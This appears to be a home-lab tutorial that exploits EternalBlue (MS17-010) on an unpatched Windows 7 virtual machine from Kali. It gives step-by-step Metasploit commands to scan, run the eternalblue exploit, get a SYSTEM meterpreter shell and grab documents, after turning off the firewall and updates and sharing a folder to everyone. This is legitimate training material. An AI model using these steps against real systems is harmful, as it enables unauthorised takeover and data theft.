=== Eternalblue - ms17_1010 vulnerability lab ===

--- Items required for procedure ---
1x Win7 iso via archive.org - https://archive.org/details/20230422_20230422_1429
1x Kali Linux iso
1x Virtualization platform
1x Laptop/desktop

--- Procedure ---
1. Prepare virtualised environment for both kali and win7 machines
2. Before starting the win7 virtual machine, ensure that the network adaptor is turned off. This is to ensure no updates go to the windows 7 vm, patching the relevant vulnerability
3. Start virtual machines and go through configuration
4. Once presented with both login screens for windows and kali virtual machines. Start with ensuring the win7 virtual machine and lab environment is prepared.

Win7 lab environment preparation
Disable windows firewall
1. Press the windows key on your keyboard and type “Firewall”
2. Press enter
3. Disable all options for the windows firewall

Disable windows updates
1. Press the winodws key on your keyboard, type “Updates”
2. Press enter
3. In the left hand menu is: “Change settings”, select this option
4. Click the dropdown under: “Important updates”
5. Select: “Never check for updates (not recommended)”
6. Save by choosing “OK” at the bottom of the screen

Re-enable the Network adaptor from within VirtualBox
Change your Network adaptor on your win7 and kali virtual machines from “NAT” to “Bridged adaptor”, bringing the ips to your main network for further manipulation.
Win7 and kali virtual machines are fully prepared

This vulnerability also involves smb, therefore, it may also be recommended to:
1. Create a folder in documents titled: “test”
2. Proceed with sharing this folder to everyone and giving “everyone” read/write permissions or higher.

Reconnaissance basics
1. On the win7 machine (now referred to as the target), press the windows key
2. Type `cmd`
3. Press enter
4. Type `ipconfig`
5. Gather your ip address from the results

Nmap scan
1. On your kali virtual machine (now referred to as the attacker), press the windows key
2. Type `terminal`
3. Input `nmap <target ip>`
You are looking for port 445 being active, if this is the case. Proceed to the next phase.

Metasploit framework
Determine if machine is vulnerable
1. Within your kali linux terminal, input `msfconsole`
2. Wait a moment for metasploit framework to load
3. Once loaded, input `search ms17`
4. You will be presented with several options, input `use auxiliary/scanner/smb/smb_ms17_010`
5. Type `show options`
6. Input `SET RHOSTS <target ip>`
7. Type “run”
8. This should result in “The machine is vulnerable to…”. Once confirmed the machine is vulnerable.

Meterpreter shell
Now we can gain a shell into the target machine via metasploit framework
1. Input `search ms17`
2. Type `use exploit/windows/smb/ms17_010_eternalblue`
3. Type `show options`
4. Input `SET RHOSTS <target IP>`
5. Type `run`

Congratulations, you have gained a meterpreter shell into the machine.

Type `getuid` to ensure you are the system user within the target machine.
You can type `shell` to get a full shell and do some further stuff like upload or grab documents for other shell options.
